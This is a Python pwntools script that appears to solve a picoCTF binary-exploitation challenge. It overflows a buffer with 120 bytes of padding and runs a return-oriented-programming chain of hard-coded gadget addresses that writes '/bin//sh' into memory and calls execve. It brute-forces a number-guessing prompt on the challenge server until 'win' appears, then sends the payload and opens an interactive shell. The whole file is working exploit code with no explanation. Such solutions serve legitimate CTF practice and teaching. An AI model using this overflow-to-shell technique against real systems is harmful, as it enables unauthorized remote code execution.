from pwn import *
import time

## SERVER
pop_rax = 0x00000000004163f4
pop_rdx = 0x000000000044a6b5
pop_rdi = 0x0000000000400696
pop_rsi = 0x0000000000410ca3
syscall = 0x000000000040137c
bss = 0x00000000006bc3a0
text = b'/bin//sh'
mov_rdi_rsi = 0x0000000000447d7b
## SERVER

payload = ('a'*120).encode ()

# setting rax (0x3b)
payload += p64 (pop_rax)
payload += p64 (0x3b)

# setting rdi ('/bin/sh')
payload += p64 (pop_rdi)
payload += p64 (bss)
payload += p64 (pop_rsi)
payload += text
payload += p64 (mov_rdi_rsi)

# zeroing rdx and rsi
payload += p64 (pop_rdx)
payload += p64 (0x0)
payload += p64 (pop_rsi)
payload += p64 (0x0)

# syscall
payload += p64 (syscall)

#p = process ('server_program')
p = remote ('jupiter.challenges.picoctf.org', 26735)
while True:
    for i in range (1, 101):
        print (str (i) + ' : ', end = '')
        time.sleep (0.2)
        x = str (p.read ())
        print (x)
        if 'win' in x:
            print ('sending the payload')
            time.sleep (0.2)
            p.sendline (payload)
            p.interactive ()
        print ('---------')
        p.sendline ( str (i))
